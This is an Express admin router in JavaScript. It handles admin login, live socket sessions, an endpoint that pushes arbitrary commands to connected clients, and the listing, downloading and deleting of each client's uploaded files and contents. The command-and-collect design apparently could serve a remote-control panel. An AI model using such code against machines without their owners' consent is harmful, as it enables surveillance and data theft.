import fs from "fs";
import path from "path";
import { Router } from "express";
import bcrypt from "bcryptjs";
import { supabase } from "../db/supabase.js";
import { requireAdmin, signAdminToken } from "../middleware/auth.js";
import { emitToClient, getSession, listSessions, liveUsernames } from "../sockets/hub.js";
import { getStats } from "../services/stats.js";
import { deleteClient, getClient, listClients } from "../services/clients.js";
import {
  deleteFile,
  deleteFolder,
  filesForUser,
  getFile,
  listFiles,
} from "../services/files.js";
import {
  contentsForUser,
  deleteContent,
  deleteContentFolder,
  getContent,
  listContents,
} from "../services/contents.js";
import { buildFolderTree } from "../utils/tree.js";
import { isInsideUploadDir } from "../services/storage.js";
import { collectUploadFiles, deleteUploadPath, listUploadDir, readUploadText, resolveUploadRel } from "../services/disk.js";
import { asText } from "../utils/paths.js";

export const adminRouter = Router();

adminRouter.post("/login", async (req, res) => {
  try {
    const email = asText(req.body?.email).trim().toLowerCase();
    const password = asText(req.body?.password);
    if (!email || !password) {
      return res.status(400).json({ error: "Email and password are required" });
    }

    const { data: admin, error } = await supabase
      .from("admins")
      .select("id, email, password_hash")
      .eq("email", email)
      .maybeSingle();
    if (error) throw error;
    if (!admin) return res.status(401).json({ error: "Invalid credentials" });

    const ok = await bcrypt.compare(password, admin.password_hash);
    if (!ok) return res.status(401).json({ error: "Invalid credentials" });

    const token = signAdminToken(admin);
    return res.json({
      token,
      admin: { id: admin.id, email: admin.email },
    });
  } catch (err) {
    console.error("POST /admin/login", err);
    return res.status(500).json({ error: "Login failed" });
  }
});

adminRouter.use(requireAdmin);

adminRouter.get("/me", (req, res) => {
  return res.json({ admin: { id: req.admin.sub, email: req.admin.email } });
});

adminRouter.get("/sockets", (_req, res) => {
  return res.json({ sockets: listSessions() });
});

adminRouter.post("/sockets/:socketId/command", (req, res) => {
  try {
    const event = asText(req.body?.event).trim();
    const data = req.body?.data;
    const ok = emitToClient(req.app.get("io"), req.params.socketId, event, data, {
      username: asText(req.body?.username).trim(),
      client_id: req.body?.client_id,
    });
    if (!ok) return res.status(404).json({ error: "Client is not connected" });
    return res.json({ ok: true, socket: getSession(req.params.socketId) });
  } catch (err) {
    console.error("POST /admin/sockets/:socketId/command", err);
    return res.status(err.status || 500).json({ error: err.message || "Send failed" });
  }
});

adminRouter.get("/stats", async (_req, res) => {
  try {
    const stats = await getStats();
    return res.json(stats);
  } catch (err) {
    console.error("GET /admin/stats", err);
    return res.status(500).json({ error: "Failed to load stats" });
  }
});

adminRouter.get("/clients", async (_req, res) => {
  try {
    const live = new Set(liveUsernames());
    const clients = (await listClients()).map((row) => ({
      ...row,
      online: live.has(row.username),
    }));
    return res.json({ clients });
  } catch (err) {
    console.error("GET /admin/clients", err);
    return res.status(500).json({ error: "Failed to load clients" });
  }
});

adminRouter.post("/clients/purge-offline", async (_req, res) => {
  try {
    const live = new Set(liveUsernames());
    const all = await listClients();
    const offline = all.filter((row) => !live.has(row.username));
    for (const row of offline) {
      await deleteClient(row.username);
    }
    return res.json({ deleted: offline.length, usernames: offline.map((row) => row.username) });
  } catch (err) {
    console.error("POST /admin/clients/purge-offline", err);
    return res.status(500).json({ error: "Failed to remove offline clients" });
  }
});

adminRouter.delete("/clients/:username", async (req, res) => {
  try {
    const username = decodeURIComponent(req.params.username);
    const live = new Set(liveUsernames());
    if (live.has(username)) {
      return res.status(409).json({ error: "Client is live. Disconnect it first." });
    }
    await deleteClient(username);
    return res.json({ ok: true, username });
  } catch (err) {
    console.error("DELETE /admin/clients/:username", err);
    return res.status(err.status || 500).json({ error: err.message || "Delete failed" });
  }
});

adminRouter.get("/clients/:username/tree", async (req, res) => {
  try {
    const username = req.params.username;
    const [client, files, contents] = await Promise.all([
      getClient(username),
      filesForUser(username),
      contentsForUser(username),
    ]);
    if (!client) return res.status(404).json({ error: "Client not found" });
    return res.json({
      client,
      tree: buildFolderTree(files, contents),
      files,
      contents,
    });
  } catch (err) {
    console.error("GET /admin/clients/:username/tree", err);
    return res.status(500).json({ error: "Failed to load tree" });
  }
});

adminRouter.get("/files", async (req, res) => {
  try {
    const files = await listFiles({
      username: req.query.username,
      folder: req.query.folder,
      q: req.query.q,
      limit: req.query.limit,
    });
    return res.json({ files });
  } catch (err) {
    console.error("GET /admin/files", err);
    return res.status(500).json({ error: "Failed to load files" });
  }
});

adminRouter.get("/files/:id/download", async (req, res) => {
  try {
    const file = await getFile(req.params.id);
    if (!file || !file.disk_path || !isInsideUploadDir(file.disk_path)) {
      return res.status(404).json({ error: "File not found" });
    }
    if (!fs.existsSync(file.disk_path)) {
      return res.status(404).json({ error: "File missing on disk" });
    }
    return res.download(file.disk_path, file.file_name);
  } catch (err) {
    console.error("GET /admin/files/:id/download", err);
    return res.status(500).json({ error: "Download failed" });
  }
});

adminRouter.delete("/files/:id", async (req, res) => {
  try {
    const file = await deleteFile(req.params.id);
    if (!file) return res.status(404).json({ error: "File not found" });
    return res.json({ ok: true });
  } catch (err) {
    console.error("DELETE /admin/files/:id", err);
    return res.status(500).json({ error: "Delete failed" });
  }
});

adminRouter.delete("/folders", async (req, res) => {
  try {
    const username = asText(req.body?.username).trim();
    const folderPath = asText(req.body?.folderPath);
    if (!username) return res.status(400).json({ error: "username is required" });
    const files = await deleteFolder(username, folderPath);
    const contents = await deleteContentFolder(username, folderPath);
    return res.json({
      ok: true,
      deletedFiles: files.deleted,
      deletedContents: contents.deleted,
    });
  } catch (err) {
    console.error("DELETE /admin/folders", err);
    return res.status(500).json({ error: "Folder delete failed" });
  }
});

adminRouter.get("/contents", async (req, res) => {
  try {
    const contents = await listContents({
      username: req.query.username,
      folder: req.query.folder,
      q: req.query.q,
      limit: req.query.limit,
    });
    return res.json({ contents });
  } catch (err) {
    console.error("GET /admin/contents", err);
    return res.status(500).json({ error: "Failed to load contents" });
  }
});

adminRouter.get("/contents/:id", async (req, res) => {
  try {
    const content = await getContent(req.params.id);
    if (!content) return res.status(404).json({ error: "Content not found" });
    return res.json({ content });
  } catch (err) {
    console.error("GET /admin/contents/:id", err);
    return res.status(500).json({ error: "Failed to load content" });
  }
});

adminRouter.get("/contents/:id/download", async (req, res) => {
  try {
    const content = await getContent(req.params.id);
    if (!content) return res.status(404).json({ error: "Content not found" });
    if (content.disk_path && isInsideUploadDir(content.disk_path) && fs.existsSync(content.disk_path)) {
      return res.download(content.disk_path, content.file_name);
    }
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.setHeader(
      "Content-Disposition",
      `attachment; filename="${path.basename(content.file_name || "content.txt")}"`
    );
    return res.send(content.file_content || "");
  } catch (err) {
    console.error("GET /admin/contents/:id/download", err);
    return res.status(500).json({ error: "Download failed" });
  }
});

adminRouter.delete("/contents/:id", async (req, res) => {
  try {
    const content = await deleteContent(req.params.id);
    if (!content) return res.status(404).json({ error: "Content not found" });
    return res.json({ ok: true });
  } catch (err) {
    console.error("DELETE /admin/contents/:id", err);
    return res.status(500).json({ error: "Delete failed" });
  }
});

adminRouter.get("/disk", async (req, res) => {
  try {
    const listing = await listUploadDir(asText(req.query.path));
    return res.json(listing);
  } catch (err) {
    console.error("GET /admin/disk", err);
    return res.status(err.status || 500).json({ error: err.message || "Failed to list disk" });
  }
});

adminRouter.get("/disk/collect", async (req, res) => {
  try {
    const files = await collectUploadFiles(asText(req.query.path));
    return res.json({ files });
  } catch (err) {
    console.error("GET /admin/disk/collect", err);
    return res.status(err.status || 500).json({ error: err.message || "Failed to collect files" });
  }
});

adminRouter.get("/disk/preview", async (req, res) => {
  try {
    const preview = await readUploadText(asText(req.query.path));
    return res.json(preview);
  } catch (err) {
    console.error("GET /admin/disk/preview", err);
    return res.status(err.status || 500).json({ error: err.message || "Preview failed" });
  }
});

adminRouter.get("/disk/download", async (req, res) => {
  try {
    const { abs } = resolveUploadRel(asText(req.query.path));
    if (!fs.existsSync(abs) || !fs.statSync(abs).isFile()) {
      return res.status(404).json({ error: "File not found" });
    }
    return res.download(abs, path.basename(abs));
  } catch (err) {
    console.error("GET /admin/disk/download", err);
    return res.status(err.status || 500).json({ error: err.message || "Download failed" });
  }
});

adminRouter.delete("/disk", async (req, res) => {
  try {
    const rel = asText(req.body?.path || req.query.path);
    const result = await deleteUploadPath(rel);
    return res.json({ ok: true, ...result });
  } catch (err) {
    console.error("DELETE /admin/disk", err);
    return res.status(err.status || 500).json({ error: err.message || "Delete failed" });
  }
});
